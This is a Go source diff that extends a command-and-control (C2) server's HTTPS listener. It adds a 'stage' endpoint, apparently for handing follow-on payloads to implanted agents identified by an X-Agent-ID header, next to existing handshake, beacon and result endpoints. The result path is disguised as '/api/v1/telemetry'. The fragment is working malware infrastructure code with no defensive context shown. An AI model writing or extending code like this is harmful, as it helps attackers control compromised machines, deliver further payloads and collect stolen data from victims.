@@ -20,6 +20,10 @@ func startListener(addr, certFile, keyFile string) {
 	if resultPath == "" {
 		resultPath = "/api/v1/telemetry"
 	}
+	stagePathCfg := PROFILE.Paths["stage"]
+	if stagePathCfg == "" {
+		stagePathCfg = "/api/v1/stage"
+	}
 
 	mux.HandleFunc(handshakePath, func(w http.ResponseWriter, r *http.Request) {
 		if r.Method != http.MethodPost {
@@ -42,8 +46,15 @@ func startListener(addr, certFile, keyFile string) {
 		}
 		handleResult(w, r, r.Header.Get("X-Agent-ID"))
 	})
+	mux.HandleFunc(stagePathCfg, func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodGet {
+			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+		handleStage(w, r, r.Header.Get("X-Agent-ID"))
+	})
 
-	log.Printf("[c2] listening on %s (handshake=%s beacon=%s result=%s)", addr, handshakePath, beaconPath, resultPath)
+	log.Printf("[c2] listening on %s (handshake=%s beacon=%s result=%s stage=%s)", addr, handshakePath, beaconPath, resultPath, stagePathCfg)
 	if err := http.ListenAndServeTLS(addr, certFile, keyFile, mux); err != nil {
 		log.Fatalf("[c2] %v", err)
 	}
